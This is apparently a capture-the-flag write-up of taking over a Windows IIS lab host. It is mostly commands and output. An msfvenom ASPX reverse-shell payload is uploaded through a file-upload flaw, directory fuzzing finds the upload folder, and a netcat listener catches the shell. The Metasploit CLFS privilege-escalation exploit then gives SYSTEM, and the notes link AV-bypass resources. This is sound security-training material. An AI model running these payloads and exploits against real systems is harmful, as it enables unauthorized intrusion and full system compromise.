Found file upload on the webiste
`aspx` file works so i did

```sh
─$ sudo msfvenom -p windows/x64/shell_reverse_tcp LHOST=172.27.230.244 LPORT=1337 -f aspx -o rev.aspx
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of aspx file: 3423 bytes
Saved as: rev.aspx
```


```sh
# ffuf -u "http://172.31.71.48/FUZZ" -w /usr/share/wordlists/dirb/common.txt

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://172.31.71.48/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/common.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

                        [Status: 200, Size: 16037, Words: 4882, Lines: 410, Duration: 1056ms]
assets                  [Status: 301, Size: 150, Words: 9, Lines: 2, Duration: 1664ms]
content                 [Status: 301, Size: 151, Words: 9, Lines: 2, Duration: 2266ms]
Content                 [Status: 301, Size: 151, Words: 9, Lines: 2, Duration: 2149ms]
controllers             [Status: 301, Size: 155, Words: 9, Lines: 2, Duration: 2017ms]
favicon.ico             [Status: 200, Size: 32038, Words: 13, Lines: 1, Duration: 1630ms]
fonts                   [Status: 301, Size: 149, Words: 9, Lines: 2, Duration: 1695ms]
home                    [Status: 200, Size: 16037, Words: 4882, Lines: 410, Duration: 2159ms]
Home                    [Status: 200, Size: 16037, Words: 4882, Lines: 410, Duration: 2158ms]
obj                     [Status: 301, Size: 147, Words: 9, Lines: 2, Duration: 3801ms]
packages                [Status: 301, Size: 152, Words: 9, Lines: 2, Duration: 1369ms]
properties              [Status: 301, Size: 154, Words: 9, Lines: 2, Duration: 3459ms]
Scripts                 [Status: 301, Size: 151, Words: 9, Lines: 2, Duration: 3506ms]
scripts                 [Status: 301, Size: 151, Words: 9, Lines: 2, Duration: 3558ms]
uploadedfiles           [Status: 301, Size: 157, Words: 9, Lines: 2, Duration: 3718ms]
```

on `uploadedfiles` i run my uploaded files and got a shell

```sh
# sudo rlwrap nc -lnvp 1337
listening on [any] 1337 ...
connect to [172.27.230.244] from (UNKNOWN) [172.31.71.48] 58913
Microsoft Windows [Version 10.0.20348.587]
(c) Microsoft Corporation. All rights reserved.

c:\windows\system32\inetsrv>whoami
whoami
iis apppool\defaultapppool

c:\windows\system32\inetsrv>
```
To get the user flag

```sh

C:\>dir /s /b | findstr /i "user.txt"
dir /s /b | findstr /i "user.txt"
C:\TheGraphicCanvas\uploadedFiles\user.txt

```

## Root



```sh
C:\>whoami /priv
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeAuditPrivilege              Generate security audits                  Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
```

- https://github.com/itm4n/FullPowers/blob/master/README.md


## WIndows Defender Recond

```sh
C:\Windows\Temp>sc query Windefend
sc query Windefend

SERVICE_NAME: Windefend 
        TYPE               : 10  WIN32_OWN_PROCESS  
        STATE              : 4  RUNNING 
                                (STOPPABLE, NOT_PAUSABLE, ACCEPTS_PRESHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0

C:\Windows\Temp>


```


- Bypass AV
- https://github.com/gh0x0st/Get-ReverseShell
- https://www.youtube.com/watch?v=ckDobbIWasU


The WIndows version is : `windows version: 10.0.20348.0` which is vulnerable to `Windows Common Log File System Driver (clfs.sys)` Privilege escalation

- Link : https://www.rapid7.com/db/modules/exploit/windows/local/cve_2023_28252_clfs_driver/



```sh
============================
 5   exploit/windows/local/cve_2023_28252_clfs_driver               Yes                      The target appears to be vulnerable. The target is running windows version: 10.0.20348.0 which has a vulnerable version of clfs.sys installed by default                                                   
msf6 post(multi/recon/local_exploit_suggester) > use exploit/windows/local/cve_2023_28252_clfs_driver
[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp
msf6 exploit(windows/local/cve_2023_28252_clfs_driver) > set payload windows/x64/shell_reverse_tcp
payload => windows/x64/shell_reverse_tcp
msf6 exploit(windows/local/cve_2023_28252_clfs_driver) > options 

Module options (exploit/windows/local/cve_2023_28252_clfs_driver):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SESSION                   yes       The session to run this module on


Payload options (windows/x64/shell_reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     192.168.139.202  yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Windows x64



View the full module info with the info, or info -d command.

msf6 exploit(windows/local/cve_2023_28252_clfs_driver) > set session 5 
session => 5
msf6 exploit(windows/local/cve_2023_28252_clfs_driver) > set lhost tun0 
lhost => 172.27.231.32
msf6 exploit(windows/local/cve_2023_28252_clfs_driver) > run

[*] Started reverse TCP handler on 172.27.231.32:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target appears to be vulnerable. The target is running windows version: 10.0.20348.0 which has a vulnerable version of clfs.sys installed by default
[*] Launching netsh to host the DLL...
[+] Process 4144 launched.
[*] Reflectively injecting the DLL into 4144...
[+] Exploit finished, wait for (hopefully privileged) payload execution to complete.
[*] Command shell session 6 opened (172.27.231.32:4444 -> 172.31.67.238:52609) at 2024-06-15 21:01:21 -0400


Shell Banner:
Microsoft Windows [Version 10.0.20348.587]
-----
          

c:\windows\system32\inetsrv>whoami
whoami
nt authority\system

FlagY{90e6dc32d193b99c0830412ef6061aee}
```